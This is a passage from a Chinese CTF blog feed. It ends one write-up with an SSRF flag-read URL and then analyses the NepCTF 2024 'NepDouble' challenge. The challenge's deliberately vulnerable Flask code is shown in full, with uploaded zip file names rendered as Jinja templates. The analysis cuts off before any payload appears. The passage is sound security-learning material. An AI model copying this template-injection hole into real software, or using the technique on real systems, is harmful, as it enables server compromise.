其实应该有不少小问题，但大致思路就是这样，运行之后就写shell了</p><p>可惜靶机关了，我也懒得起一个配置好的lamp服务（</p><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>逆天了，怎么有人能爆出flag路径的：<code>file://localhost/ffffffllllllaaaaagggggggg</code></p><hr><h1 id="tomcom2"><a href="#tomcom2" class="headerlink" title="tomcom2"></a>tomcom2</h1>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g&quot;&gt;https://mp.weixin.qq.com/s/3C0vRu8Mtaj4tzOsj4lY_g&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="CTF线上赛" scheme="http://c1oudfl0w0.github.io/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    
    
    <category term="反序列化" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="SSRF" scheme="http://c1oudfl0w0.github.io/blog/tags/SSRF/"/>
    
  </entry>
  
  <entry>
    <title>NepCTF 2024</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/08/24/NepCTF-2024/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/08/24/NepCTF-2024/</id>
    <published>2024-08-24T04:15:15.000Z</published>
    <updated>2024-08-31T06:15:22.111Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>php master，除了php其它都不会（</p><p>参考wp：</p><p><a href="https://chenxi9981.github.io/NepCTF_2024/">https://chenxi9981.github.io/NepCTF_2024/</a></p><p><a href="https://natro92.fun/posts/64a8e859">https://natro92.fun/posts/64a8e859</a></p><span id="more"></span><hr><h1 id="NepDouble（复现）"><a href="#NepDouble（复现）" class="headerlink" title="NepDouble（复现）"></a>NepDouble（复现）</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span>render_template_string<span class="token keyword">from</span> zipfile <span class="token keyword">import</span> ZipFile<span class="token keyword">import</span> os<span class="token keyword">import</span> datetime<span class="token keyword">import</span> hashlib<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Environment<span class="token punctuation">,</span> FileSystemLoaderapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">,</span>template_folder<span class="token operator">=</span><span class="token string">'static'</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'MAX_CONTENT_LENGTH'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>UPLOAD_FOLDER <span class="token operator">=</span> <span class="token string">'/app/uploads'</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span> <span class="token operator">=</span> UPLOAD_FOLDER<span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span><span class="token punctuation">:</span>    os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">)</span>template_env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>FileSystemLoader<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span>template_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template_string</span><span class="token punctuation">(</span>template_string<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span>template_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Please use POST method to upload files.'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_uploads_folder<span class="token punctuation">(</span><span class="token punctuation">)</span>        files <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tp_file'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> files<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No file uploaded.'</span>        file_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        files<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        file_extension <span class="token operator">=</span> files<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> file_extension <span class="token operator">!=</span> <span class="token string">'zip'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid file type. Please upload a .zip file.'</span>        timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>        md5_dir_name <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>timestamp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        unzip_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md5_dir_name<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> ZipFile<span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">as</span> zip_file<span class="token punctuation">:</span>            zip_file<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>unzip_folder<span class="token punctuation">)</span>        files_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>                relative_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>relpath<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                link <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;a href="/cat?file=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>relative_path<span class="token punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>'</span></span>                files_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid filename.'</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'An error occurred. Please check your file and try again.'</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/cat'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File path is missing.'</span>    new_file <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>commonprefix<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid file path.'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>islink<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Symbolic links are not allowed.'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> file_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> read_large_file<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span>content<span class="token operator">=</span>content<span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">,</span>dates<span class="token operator">=</span>Exec_date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File not found.'</span>    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Error reading file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span class="token keyword">def</span> <span class="token function">Exec_date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    d_res <span class="token operator">=</span> os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'date'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> d_res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">" "</span><span class="token operator">+</span>d_res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">clear_uploads_folder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> topdown<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token builtin">dir</span> <span class="token keyword">in</span> dirs<span class="token punctuation">:</span>            os<span class="token punctuation">.</span>rmdir<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">read_large_file</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>            content <span class="token operator">+=</span> line    <span class="token keyword">return</span> content<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token string">"8000"</span><span class="token punctuation">,</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>审一下代码</p><p>首先是<code>/</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">!=</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Please use POST method to upload files.'</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        clear_uploads_folder<span class="token punctuation">(</span><span class="token punctuation">)</span>        files <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tp_file'</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> files<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'No file uploaded.'</span>        file_size <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>files<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        files<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>        file_extension <span class="token operator">=</span> files<span class="token punctuation">.</span>filename<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> file_extension <span class="token operator">!=</span> <span class="token string">'zip'</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">'Invalid file type. Please upload a .zip file.'</span>        timestamp <span class="token operator">=</span> datetime<span class="token punctuation">.</span>datetime<span class="token punctuation">.</span>now<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y%m%d%H%M%S'</span><span class="token punctuation">)</span>        md5_dir_name <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>timestamp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>        unzip_folder <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> md5_dir_name<span class="token punctuation">)</span>        os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        <span class="token keyword">with</span> ZipFile<span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token keyword">as</span> zip_file<span class="token punctuation">:</span>            zip_file<span class="token punctuation">.</span>extractall<span class="token punctuation">(</span>path<span class="token operator">=</span>unzip_folder<span class="token punctuation">)</span>        files_list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> root<span class="token punctuation">,</span> dirs<span class="token punctuation">,</span> files <span class="token keyword">in</span> os<span class="token punctuation">.</span>walk<span class="token punctuation">(</span>unzip_folder<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> files<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>                file_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>root<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>                relative_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>relpath<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                link <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'&lt;a href="/cat?file=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>relative_path<span class="token punctuation">&#125;</span></span><span class="token string">"></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span></span><span class="token string">&lt;/a>'</span></span>                files_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid filename.'</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'An error occurred. Please check your file and try again.'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>上传zip并解压的功能，不写前端是吧😡</p><p>上传的文件会被解压，然后在 &#x2F;cat 路由创建一个文件读取的链接</p><p>再看一下 &#x2F;cat</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/cat'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">cat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    file_path <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'file'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> file_path<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File path is missing.'</span>    new_file <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> file_path<span class="token punctuation">)</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>commonprefix<span class="token punctuation">(</span><span class="token punctuation">[</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">,</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>abspath<span class="token punctuation">(</span>app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'UPLOAD_FOLDER'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Invalid file path.'</span>    <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>islink<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'Symbolic links are not allowed.'</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>        filename <span class="token operator">=</span> file_path<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        content <span class="token operator">=</span> read_large_file<span class="token punctuation">(</span>new_file<span class="token punctuation">)</span>        <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span>content<span class="token operator">=</span>content<span class="token punctuation">,</span>filename<span class="token operator">=</span>filename<span class="token punctuation">,</span>dates<span class="token operator">=</span>Exec_date<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> FileNotFoundError<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">'File not found.'</span>    <span class="token keyword">except</span> IOError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'Error reading file: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">'</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ban了目录穿越和软链接</p><p>用重写过的<code>render_template</code>对读取的内容进行渲染</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">template_env <span class="token operator">=</span> Environment<span class="token punctuation">(</span>loader<span class="token operator">=</span>FileSystemLoader<span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> autoescape<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>get_template<span class="token punctuation">(</span>template_name<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">render_template_string</span><span class="token punctuation">(</span>template_string<span class="token punctuation">,</span> <span class="token operator">**</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    template <span class="token operator">=</span> template_env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span>template_string<span class="token punctuation">)</span>    <span class="token keyword">return</span> template<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>context<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>明显不能从文件内容和文件名上进行ssti。。。吗？</p><p>仔细看一下这俩的差别，前者是从文件加载模板，后者是动态生成模板内容，也就是说后者可以进行ssti</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span><span class="token string">'&lt;br>'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>files_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要上传的压缩包里面的文件名为我们的payload：</p><pre class="line-numbers language-django" data-language="django"><code class="language-django"><span class="token django language-django"><span class="token delimiter 